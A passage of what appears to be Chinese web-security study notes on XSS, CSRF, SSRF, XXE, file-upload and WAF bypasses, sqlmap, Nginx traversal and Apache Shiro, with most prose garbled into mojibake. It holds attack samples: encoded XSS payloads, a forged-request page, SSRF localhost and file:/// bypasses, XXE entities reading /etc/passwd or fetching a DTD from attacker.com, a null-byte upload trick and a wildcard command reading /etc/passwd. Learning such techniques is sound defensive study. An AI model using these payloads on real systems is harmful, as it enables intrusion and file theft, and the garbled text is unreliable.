ä¸º<code>%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E</code>ã€‚</li><li>åå…­è¿›åˆ¶ç¼–ç ï¼šæ”»å‡»è€…é€šè¿‡å¯¹æ¶æ„è„šæœ¬ä»£ç è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä»è€Œç»•è¿‡åº”ç”¨ç¨‹åºçš„è¿‡æ»¤å’ŒéªŒè¯ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code>ç¼–ç ä¸º<code>%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E</code>ã€‚</li></ol><h2 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤"></a>é˜²æŠ¤</h2><ul><li>ä½¿ç”¨HTTPOnly Cookieã€‚HTTPOnly Cookieåªèƒ½é€šè¿‡HTTPåè®®ä¼ è¾“ï¼Œæ— æ³•é€šè¿‡JavaScriptç­‰è„šæœ¬è¯­è¨€è®¿é—®ï¼Œä»è€Œé˜²æ­¢æ¶æ„è„šæœ¬ä»£ç è®¿é—®Cookieã€‚è¿™æ ·ï¼Œå³ä½¿æ¶æ„è„šæœ¬ä»£ç èƒ½å¤Ÿæ³¨å…¥åˆ°ç½‘é¡µä¸­ï¼Œä¹Ÿæ— æ³•çªƒå–ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯</li></ul><h1 id="CSFR"><a href="#CSFR" class="headerlink" title="CSFR"></a>CSFR</h1><p>è·¨ç«™è„šæœ¬æ”»å‡»</p><p>åŸç†</p><ul><li>åŒç«™è¯·æ±‚<ul><li>ä¸€ä¸ªæ¥è‡ªexample.comçš„ç½‘é¡µå‘example.comå‘é€è¯·æ±‚</li></ul></li><li>è·¨ç«™è¯·æ±‚<ul><li>evil.comå‘example.comå‘é€è¯·æ±‚</li></ul></li></ul><p>å‡è®¾å—å®³è€…è®¿é—®äº†evil.comï¼Œè¯¥ç½‘é¡µä¸­åµŒå…¥äº†jsä»£ç ï¼Œè¿›è¡Œäº†è·¨ç«™è¯·æ±‚ï¼Œæµè§ˆå™¨åœ¨è¯·æ±‚å‘èµ·æ—¶é™„åŠ æ‰€æœ‰å±äºexample.comçš„cookiesï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆè·¨ç«™è„šæœ¬æ”»å‡»</p><p>ä¸€ä¸ªgetè¯·æ±‚ç¤ºä¾‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=59&quot;</span> </span><br><span class="hljs-tag">            <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>src</code>å±æ€§æŒ‡å®šä¸€ä¸ªURL <code>http://www.csrflabelgg.com/action/friends/add?friend=59</code>ï¼Œå®ƒä¼¼ä¹æ˜¯å¸¦æœ‰<code>friend</code>å‚æ•°çš„HTTP GETè¯·æ±‚çš„URLã€‚å¦‚æœç”¨æˆ·è®¿é—®äº†è¿™ä¸ªé¡µé¢å¹¶ä¸”å·²ç»ç™»é™†åˆ°csrflabelgg.comç½‘ç«™ï¼Œåˆ™è¯¥ GET è¯·æ±‚ä¼šå‘è¯¥ç½‘ç«™å‘é€<code>friend=59</code>å‚æ•°çš„è¯·æ±‚</p><h2 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h2><ul><li>éªŒè¯token<ul><li>åœ¨æ¯ä¸ªHTTPè¯·æ±‚é‡Œé™„åŠ ä¸€éƒ¨åˆ†tokenä¿¡æ¯</li></ul></li><li>Refereræ ‡è¯†äº†è¯·æ±‚æ˜¯ä»å“ªé‡Œå‘èµ·çš„<ul><li>å¯ä»¥é€šè¿‡åˆ¤æ–­æœ‰é—®é¢˜çš„è¯·æ±‚æ˜¯å¦æ˜¯åŒåŸŸä¸‹å‘èµ·çš„æ¥é˜²å¾¡CSRFæ”»å‡»</li></ul></li><li>å¯ä»¥åœ¨headerä¸­å¢åŠ csrf_token</li></ul><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRFï¼ˆServer-side Request Forgeï¼‰ã€‚SSRFæ˜¯ä»æœåŠ¡å™¨å‘å‡ºçš„ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„urlæ¥è®¿é—®åŸæœ¬è®¿é—®ä¸åˆ°çš„å†…ç½‘ä¿¡æ¯ï¼Œæ”»å‡»å†…ç½‘æˆ–è€…æœ¬åœ°å…¶ä»–æœåŠ¡</p><h2 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ul><li>ä½¿ç”¨ URL ç¼–ç ï¼ˆç™¾åˆ†å·ç¼–ç ï¼‰ç»•è¿‡ä¸€äº›å¸¸è§çš„é™åˆ¶<ul><li>æœ‰äº›æœåŠ¡å™¨åº”ç”¨ç¨‹åºå¯èƒ½è¯•å›¾é™åˆ¶åº”ç”¨ç¨‹åºå‘ç‰¹å®šçš„è·¯å¾„å‘é€è¯·æ±‚ï¼Œä½¿ç”¨ <code>%2f</code> æ›¿ä»£ <code>/</code> ç¬¦å·æ¥ç»•è¿‡è·¯å¾„é™åˆ¶ï¼Œä½¿ç”¨ <code>%25</code> æ›¿ä»£ <code>%</code> ç¬¦å·æ¥ç»•è¿‡ç™¾åˆ†å·ç¼–ç é™åˆ¶</li><li>ä½¿ç”¨ <code>%25</code> æ›¿ä»£ <code>%</code> ç¬¦å·æ¥ç»•è¿‡ç™¾åˆ†å·ç¼–ç é™åˆ¶</li></ul></li><li>dictåè®®ï¼š dict://serverip:port/å‘½ä»¤:å‚æ•°</li><li>gopheråè®®ï¼šæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ Gopher URL ï¼ˆä½¿ç”¨â€œgopher://â€åè®®å‰ç¼€ï¼‰æ¥å‘é€æ¶æ„è¯·æ±‚</li><li>File åè®®: File åè®®æ˜¯ä¸€ç§ç”¨äºè®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿçš„åè®®ã€‚file:///c:/windows/system32/drivers/etc/hosts</li><li>ipç»•è¿‡<ul><li>é€šè¿‡å„ç§éHTTPåè®®ï¼ˆä»¥ä¸Š</li><li>0.0.0.0è¿™ä¸ªIPå¯ä»¥é¥¶è¿‡æ­£åˆ™ç›´æ¥è®¿é—®åˆ°æœ¬åœ°</li><li>å°† IP åœ°å€è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ ¼å¼ï¼Œå¹¶ä½¿ç”¨åå…­è¿›åˆ¶ IP åœ°å€è¿›è¡Œ SSRF æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œå°† 192.168.1.1 è½¬æ¢ä¸º C0A80101</li><li>å°† IP åœ°å€è½¬æ¢ä¸ºé€—å·åˆ†éš”çš„æ ¼å¼ã€‚ä¾‹å¦‚ï¼Œå°† 192.168.1.1 è½¬æ¢ä¸ºâ€œ192,168,1,1â€</li><li>é‡‡ç”¨è¿›åˆ¶è½¬æ¢ï¼Œ127.0.0.1 å…«è¿›åˆ¶ï¼š**<code>0177.0.0.1</code><strong>ï¼›åå…­è¿›åˆ¶ï¼š</strong><code>0x7f.0.0.1</code><strong>ï¼›åè¿›åˆ¶ï¼š</strong><code>2130706433</code>**</li><li>åˆ©ç”¨**<code>[::]</code>ï¼Œ<code>http://[::]:80/</code>** ä¼šè§£æä¸º <strong><code>http://127.0.0.1</code></strong></li></ul></li></ul><h2 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html">https://websec.readthedocs.io/zh/latest/vuln/ssrf.html</a></li></ul><h1 id="XXEï¼ˆXML-å¤–éƒ¨å®ä½“æ³¨å…¥-XML-External-Entity-Injectionï¼‰"><a href="#XXEï¼ˆXML-å¤–éƒ¨å®ä½“æ³¨å…¥-XML-External-Entity-Injectionï¼‰" class="headerlink" title="XXEï¼ˆXML å¤–éƒ¨å®ä½“æ³¨å…¥ XML External Entity Injectionï¼‰"></a>XXEï¼ˆXML å¤–éƒ¨å®ä½“æ³¨å…¥ XML External Entity Injectionï¼‰</h1><h2 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>XML å¤–éƒ¨å®ä½“æ³¨å…¥ï¼ˆXML External Entity Injectionï¼Œç®€ç§° XXEï¼‰æ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ XML è§£æå™¨çš„æ¼æ´ï¼Œå‘åº”ç”¨ç¨‹åºæ³¨å…¥æ¶æ„çš„å¤–éƒ¨å®ä½“ï¼Œä»è€Œå¯¼è‡´åº”ç”¨ç¨‹åºå—åˆ°æ”»å‡»ã€‚ä»¥ä¸‹æ˜¯ä¸‰ä¸ªä¸ XXE æ”»å‡»ç›¸å…³çš„ç¤ºä¾‹ï¼š</p><ol><li>åœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨<strong>å¤–éƒ¨å®ä½“</strong>ï¼šæ”»å‡»è€…å¯ä»¥åœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨ä¸€ä¸ªå¤–éƒ¨å®ä½“ï¼Œä¾‹å¦‚ä¸€ä¸ªæ–‡ä»¶æˆ– URLï¼Œç„¶ååˆ©ç”¨è¯¥å®ä½“ä¸­çš„å†…å®¹æ¥æ‰§è¡Œæ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ XML æ–‡æ¡£ä¸­å¼•ç”¨ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„æ–‡ä»¶ï¼Œç„¶åé€šè¿‡è§£æè¯¥æ–‡ä»¶æ¥æ‰§è¡Œæ”»å‡»ã€‚</li><li>åœ¨ XML æ–‡æ¡£ä¸­ä½¿ç”¨<strong>å‚æ•°å®ä½“</strong>ï¼šæ”»å‡»è€…å¯ä»¥åœ¨ XML æ–‡æ¡£ä¸­ä½¿ç”¨å‚æ•°å®ä½“ï¼Œä¾‹å¦‚ %file;ï¼Œç„¶åå°†å…¶å®šä¹‰ä¸ºä¸€ä¸ªå¤–éƒ¨å®ä½“ï¼Œä¾‹å¦‚ <code>&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;</code>ï¼Œä»è€Œè¯»å–æ•æ„Ÿæ–‡ä»¶æˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚</li><li>åœ¨ XML æ–‡æ¡£ä¸­ä½¿ç”¨<strong>è¿œç¨‹å®ä½“</strong>ï¼šæ”»å‡»è€…å¯ä»¥åœ¨ XML æ–‡æ¡£ä¸­ä½¿ç”¨è¿œç¨‹å®ä½“ï¼Œä¾‹å¦‚ <code>&lt;!ENTITY file SYSTEM &quot;http://attacker.com/malicious.dtd&quot;&gt;</code>ï¼Œç„¶åå°†å…¶å®šä¹‰ä¸ºä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ DTD æ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»ã€‚</li></ol><h2 id="é˜²èŒƒ"><a href="#é˜²èŒƒ" class="headerlink" title="é˜²èŒƒ"></a>é˜²èŒƒ</h2><ul><li>ç¦ç”¨å¤–éƒ¨å®ä½“çš„å¼•å…¥</li><li>è¿‡æ»¤å¦‚SYSTEMç­‰æ•æ„Ÿå…³é”®å­—</li></ul><h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><h2 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯ä¸€ç§å¸¸è§çš„ Web åº”ç”¨ç¨‹åºå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œä¾‹å¦‚ Web shellã€æœ¨é©¬ç¨‹åºç­‰ï¼Œä»è€Œè·å–å¯¹ç›®æ ‡ç³»ç»Ÿçš„æ§åˆ¶æƒã€‚å…¶åŸç†å¦‚ä¸‹ï¼š</p><ol><li>Web åº”ç”¨ç¨‹åºé€šå¸¸å…è®¸ç”¨æˆ·<strong>ä¸Šä¼ æ–‡ä»¶</strong>ï¼Œä¾‹å¦‚å›¾ç‰‡ã€æ–‡æ¡£ç­‰ã€‚</li><li>æ”»å‡»è€…å¯ä»¥é€šè¿‡<strong>æ„é€ æ¶æ„çš„ä¸Šä¼ è¯·æ±‚</strong>ï¼Œä¾‹å¦‚<strong>ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶çš„ MIME ç±»å‹</strong>ã€ä½¿ç”¨ç‰¹æ®Šçš„æ–‡ä»¶åç­‰ï¼Œæ¥ç»•è¿‡åº”ç”¨ç¨‹åºçš„ä¸Šä¼ è¿‡æ»¤æœºåˆ¶ã€‚</li><li>æ”»å‡»è€…ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶å¯èƒ½åŒ…å«æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ Web shellã€æœ¨é©¬ç¨‹åºç­‰ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿè¿œç¨‹æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚</li></ol><h2 id="ç»•è¿‡-2"><a href="#ç»•è¿‡-2" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ul><li>ç¦ç”¨JSå®ç°ç»•è¿‡</li><li>%00ï¼Œ0x00æˆªæ–­<ul><li>æ¯”å¦‚ä¿®æ”¹æ–‡ä»¶åä¸º <strong>1.php%00.jpg</strong>ï¼Œå¦‚æœphp ç‰ˆæœ¬&lt;5.3.4  åœ¨urlä¸­%00è¡¨ç¤ºascllç çš„0 ï¼Œè€Œasciiç çš„0ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸï¼Œæ‰€ä»¥å½“urlä¸­å‡ºç°%00æ—¶å°±ä¼šè®¤ä¸ºè¯»å–å·²ç»“æŸï¼Œæœ€åä¼šè¢«è§£æä¸º 1.phpï¼Œä»è€Œå®ç°ç»•è¿‡</li></ul></li><li>æŠ“åŒ…ä¿®æ”¹MIMEç±»å‹<ul><li>æœåŠ¡ç«¯ä»£ç æ˜¯é€šè¿‡Content-Typeçš„å€¼æ¥åˆ¤æ–­æ–‡ä»¶çš„ç±»å‹ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥ç›´æ¥å¯¹æ–‡ä»¶çš„Content-Typeå€¼è¿›è¡Œä¿®æ”¹æ¥ç»•è¿‡</li></ul></li></ul><h2 id="é˜²èŒƒ-1"><a href="#é˜²èŒƒ-1" class="headerlink" title="é˜²èŒƒ"></a>é˜²èŒƒ</h2><ul><li>æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œ</li><li>é‡‡ç”¨WAFç­‰å®‰å…¨é˜²æŠ¤è®¾å¤‡</li><li>æ–‡ä»¶ç±»å‹é‡‡ç”¨ç™½åå•è€Œä¸æ˜¯é»‘åå•ï¼Œå¹¶ä¸”ç»¼åˆMIMEå’Œåç¼€åˆ¤æ–­</li></ul><h1 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h1><h2 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h2><h2 id="ç»•è¿‡-3"><a href="#ç»•è¿‡-3" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><ul><li>/usr/s?in/?at /et?/pass?d<ul><li>é—®å·(?)è¡¨ç¤ºé€šé…ç¬¦ï¼Œå¯ä»¥æ›¿æ¢ä»»æ„çš„å•ä¸ªå­—ç¬¦ï¼ˆéç©ºï¼‰ï¼Œ*è¡¨ç¤ºé€šé…ç¬¦ï¼Œå¯ä»¥åŒ¹é…ä»»æ„é•¿åº¦ï¼ˆåŒ…æ‹¬ç©ºï¼‰</li></ul></li><li>select/**/from<ul><li>å†…è”æ³¨é‡Š</li></ul></li><li>å­—ç¬¦ç¼–ç ï¼Œæ¯”å¦‚base64</li></ul><h1 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h1><h2 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h2><ol><li>Proxyï¼ˆä»£ç†ï¼‰ï¼šä½¿ç”¨ Burp Suite Proxy å·¥å…·ï¼Œç”¨æˆ·å¯ä»¥<strong>å®æ—¶æ‹¦æˆªå’ŒæŸ¥çœ‹æµè§ˆå™¨å’Œ Web æœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚å’Œå“åº”</strong>ã€‚ç”¨æˆ·å¯ä»¥ä¿®æ”¹<strong>è¯·æ±‚å’Œå“åº”æ•°æ®</strong>ï¼Œæˆ–è€…æ·»åŠ è‡ªå®šä¹‰æ•°æ®åŒ…åˆ°è¯·æ±‚æˆ–å“åº”ä¸­ä»¥è¿›è¡Œæ”»å‡»æµ‹è¯•ã€‚å¯ä»¥ä½¿ç”¨ <strong>Proxy ä»£ç†è¯·æ±‚ï¼Œè‡ªå®šä¹‰è¯·æ±‚åŒ…ï¼Œæ£€æŸ¥æœåŠ¡å™¨è¿”å›çš„å“åº”åŒ…ï¼Œè¿›è¡Œä¸­é—´äººæ”»å‡»æ¨¡æ‹Ÿç­‰ç­‰</strong></li><li>Intruderï¼ˆçˆ†ç ´ï¼‰ï¼šIntruder æ˜¯ Burp Suite å†…ç½®çš„ä¸€ç§æ”»å‡»å·¥å…·ï¼Œå¯ä»¥å¯¹ Web åº”ç”¨ç¨‹åºè¿›è¡Œé«˜æ•ˆä¸”ç²¾ç»†çš„è‡ªåŠ¨åŒ–æ”»å‡»ï¼Œä¾‹å¦‚æš´åŠ›ç ´è§£å¯†ç ã€æ‹’ç»æœåŠ¡æ”»å‡» (DoS) ç­‰ï¼Œå¯¹åº”ç”¨ç¨‹åºçš„è¾“å…¥å‚æ•°é›†åˆè¿›è¡Œæ‰¹é‡æµ‹è¯•å’Œæ”»å‡»ï¼Œå¿«é€Ÿå‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚å®ƒæ”¯æŒå¤šç§ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼ˆå¦‚çˆ†ç ´ã€å­—å…¸æ”»å‡»ã€ç²¾ç¡®åŒ¹é…ç­‰ï¼‰ï¼Œæ”¯æŒå˜é‡ä½ç½®æ ‡æ³¨ã€å¤šçº¿ç¨‹å¹¶å‘æ“ä½œç­‰é«˜çº§åŠŸèƒ½ã€‚</li><li>Repeaterï¼ˆé‡å‘å™¨ï¼‰ï¼šå…è®¸æµ‹è¯•äººå‘˜ç®€åŒ–æµ‹è¯•é…ç½®çš„è¿‡ç¨‹ï¼Œå¤åˆ¶ã€æ„å»ºå’Œä¿®æ”¹è¯·æ±‚ä¿¡æ¯å¹¶å‘é€å›æœåŠ¡å™¨ï¼Œæµ‹è¯•ä¸åŒçš„æµ‹è¯•æ•°æ®ã€ç¼–å†™ä¸åŒçš„ payload æ£€æŸ¥æœåŠ¡å™¨è¿”å›çš„å“åº”ï¼Œç”¨äºé‡æ–°æµ‹è¯•ã€é‡æ–°è°ƒæ•´å’Œé‡æ–°éªŒè¯åº”ç”¨ç¨‹åºçš„æ¯ä¸ªæ¨¡å—</li><li>Decoderï¼ˆè§£ç å™¨ï¼‰ï¼šå½“æˆ‘ä»¬åœ¨ä¸€ä¸ªåº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¸¸å¸¸ä¼šå¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œ URL ç¼–ç ã€å¯¹ HTML / JavaScript ä»£ç è¿›è¡Œè½¬ä¹‰ç­‰ï¼Œå› æ­¤åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å…ˆå¯¹è¿™äº›ç¼–ç è¿‡çš„æ•°æ®è¿›è¡Œè§£ç ï¼Œç„¶åå†è¿›è¡Œæœ‰æ•ˆçš„æ”»å‡»å’Œæ¼æ´æµ‹è¯•ã€‚Burp Suite ä¸­çš„ Decoder å·¥å…·å¯ä»¥è‡ªåŠ¨é€šè¿‡å¤šç§ç¼–ç æ–¹æ³•ï¼ˆå¦‚ Base64ã€Unicodeã€URL ç¼–ç ç­‰ï¼‰è§£ç è¯·æ±‚ï¼Œä»¥å¸®åŠ©æµ‹è¯•äººå‘˜å¿«é€Ÿåˆ†æå’Œä¿®æ”¹æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</li></ol><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><ol><li>-levelï¼šç”¨äºæŒ‡å®š SQL æ³¨å…¥æ”»å‡»æ£€æµ‹çš„çº§åˆ«ï¼ŒåŒ…æ‹¬ 1ï¼ˆé»˜è®¤ï¼‰ã€2ã€3ã€4 å’Œ 5 çº§åˆ«ï¼Œçº§åˆ«è¶Šé«˜ï¼Œæ”»å‡»æµ‹è¯•è¶Šæ·±å…¥å’Œå…¨é¢ï¼Œä½†åŒæ—¶ä¹Ÿä¼šäº§ç”Ÿæ›´å¤šçš„è™šè­¦æˆ–è¯¯æŠ¥ã€‚</li><li>-rï¼šç”¨äºæŒ‡å®š SQL æ³¨å…¥æ”»å‡»çš„ç›®æ ‡ï¼Œä¾‹å¦‚ä¸€ä¸ª HTTP è¯·æ±‚æŠ¥æ–‡ï¼Œä»è€Œè¿›è¡Œæœ‰æ•ˆçš„æ³¨å…¥æµ‹è¯•ã€‚å¯ä»¥é€šè¿‡æŠ“åŒ…å·¥å…·æ•è· HTTP è¯·æ±‚æŠ¥æ–‡ï¼Œå°†å…¶ä¿å­˜è‡³æ–‡ä»¶å¹¶ä½¿ç”¨ -r å‚æ•°æŒ‡å®šè¿›è¡Œæ³¨å…¥æµ‹è¯•ã€‚</li><li>-uï¼šç”¨äºæŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªå¾…æµ‹è¯•çš„ç›®æ ‡ URLï¼Œè¿™äº› URL é€šå¸¸åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª GET æˆ– POST å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨ SQLMap å¯¹è¿™äº›å‚æ•°è¿›è¡Œ SQL æ³¨å…¥æµ‹è¯•ã€‚</li><li>â€“methodï¼šç”¨äºè®¾ç½® SQL æ³¨å…¥æµ‹è¯•æ‰€ä½¿ç”¨çš„ HTTP è®¿é—®æ–¹æ³•ï¼ŒåŒ…æ‹¬ GETã€POSTã€HEADã€PUTã€DELETE ç­‰ã€‚</li><li>-cookieï¼šç”¨äºæŒ‡å®šæ‰€éœ€çš„è‡ªå®šä¹‰ Cookieï¼Œä¸ºäº†é€šè¿‡èº«ä»½éªŒè¯è¿‡ç¨‹ï¼Œå¯èƒ½éœ€è¦ä½¿ç”¨æœ‰æ•ˆçš„ Cookie å€¼ã€‚</li><li>-tamperï¼šç”¨äºæŒ‡å®šä½¿ç”¨ä»€ä¹ˆæ ·çš„æ··æ·†å™¨ç®—æ³•æ¥æ··æ·†è¯·æ±‚å†…å®¹ï¼Œä»è€Œæ›´éš¾è¢«æ£€æµ‹åˆ°ã€‚SQLMap å†…ç½®äº†è®¸å¤šå¸¸è§çš„æ··æ·†å™¨æŠ€å·§å’Œç®—æ³•ï¼Œå¦‚æ‹¬å·åŒ…å«ã€å¤§å°å†™æ··æ·†ã€æ³¨é‡Šã€å­—ç¬¦ä¸²ä¸²è”ç­‰ã€‚</li></ol><h1 id="ä¸­é—´ä»¶åŠå¸¸è§æ¼æ´"><a href="#ä¸­é—´ä»¶åŠå¸¸è§æ¼æ´" class="headerlink" title="ä¸­é—´ä»¶åŠå¸¸è§æ¼æ´"></a>ä¸­é—´ä»¶åŠå¸¸è§æ¼æ´</h1><h2 id="IISè§£ææ¼æ´"><a href="#IISè§£ææ¼æ´" class="headerlink" title="IISè§£ææ¼æ´"></a>IISè§£ææ¼æ´</h2><p>IIS ï¼ˆInternet Information Servicesï¼‰</p><p>å¸¸è§çš„ IIS è§£ææ¼æ´åŒ…æ‹¬ä»¥ä¸‹å‡ ç§ï¼š</p><ol><li>ç›®å½•éå†æ¼æ´ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ ç‰¹å®šçš„ URL æŸ¥è¯¢å­—ç¬¦ä¸²ä½¿ IIS è§£ææ—¶å‡ºç°ç›®å½•éå†ï¼Œè·å–åˆ°ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶ã€‚</li><li>æ–‡ä»¶åŒ…å«æ¼æ´ï¼šæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„é“¾æ¥æ„é€ åç¼€åä¸º ASP/ASPX/JSP/PHP çš„ URL æ¥æ³¨å…¥ç³»ç»Ÿå‘½ä»¤ï¼Œè¿›è€Œå¯¼è‡´ä»»æ„ IP åœ°å€çš„ä»»æ„ä»£ç æ‰§è¡Œã€‚</li><li>ä»£ç æ‰§è¡Œæ¼æ´ï¼šæ”»å‡»è€…åˆ©ç”¨ IIS çš„æŸäº›å±æ€§æˆ–æ–¹æ³•æ‰§è¡Œä»£ç ï¼Œä»è€Œçªç ´åº”ç”¨ç¨‹åºçš„å®‰å…¨æœºåˆ¶ã€‚</li></ol><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><ul><li>ç›®å½•éå†<ul><li>å¯¹äº Nginx Web æœåŠ¡å™¨æ¥è¯´ï¼Œå½“ autoindex å‚æ•°è¢«è®¾ç½®ä¸º on æ—¶ï¼Œå¼€å¯äº†è‡ªåŠ¨ç›®å½•ç´¢å¼•åŠŸèƒ½ï¼Œå°±å®¹æ˜“å—åˆ°ç›®å½•éå†æ¼æ´æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ URL ä¸­æ·»åŠ  â€œ..â€ æˆ– â€œ%2e%2e%2fâ€ ç­‰å­—ç¬¦ï¼Œæ¥è®¿é—®æœåŠ¡å™¨çš„ä»»æ„ç›®å½•å’Œæ–‡ä»¶ï¼Œè¯»å–æ•æ„Ÿæ•°æ®æˆ–æ‰§è¡Œè¿œç¨‹ä»£ç ç­‰æ“ä½œ</li></ul></li><li>ç›®å½•ç©¿è¶Š<ul><li>location /foo { alias /bar/; }ï¼Œå¦‚æœå­˜åœ¨ /foo../ çš„è¯·æ±‚ï¼Œä¼šè¢«è§£ææˆ /bar/../ï¼Œç»è¿‡è½¬åŒ–åï¼Œå³ç›¸å½“äºè·³å‡ºäº† /bar/ ç›®å½•ï¼Œä»è€Œå¯¼è‡´äº†ç›®å½•ç©¿è¶Šçš„å‘ç”Ÿã€‚</li></ul></li></ul><h1 id="Apache-Shiro"><a href="#Apache-Shiro" class="headerlink" title="Apache Shiro"></a>Apache Shiro</h1><blockquote><p>shiro 550 721åŒºåˆ«</p><p>æ¼æ´æˆå› æ˜¯å› ä¸ºæœ‰ä¸€ä¸ªremebermeçš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥å¯¹cookieè¿›è¡ŒåŠ å¯†åå­˜å‚¨ï¼Œä¸‹æ¬¡è®¿é—®å°±ä¸éœ€è¦ç™»å½•äº†ï¼Œç”Ÿæˆæ–¹æ³•æ˜¯å¯¹cookieå…ˆè¿›è¡Œåºåˆ—åŒ–ï¼ŒaesåŠ å¯†ï¼Œbase64åŠ å¯†</p><p>550å°±æ˜¯aeså®ƒæ˜¯ä½¿ç”¨å›ºå®šçš„keyè¿›è¡ŒåŠ å¯†ï¼Œæ‰€ä»¥å°±å¯ä»¥ç›´æ¥æ„é€ cookieåˆ©ç”¨</p><p>721çš„è¯æ˜¯ä½¿ç”¨aes128cbcåŠ 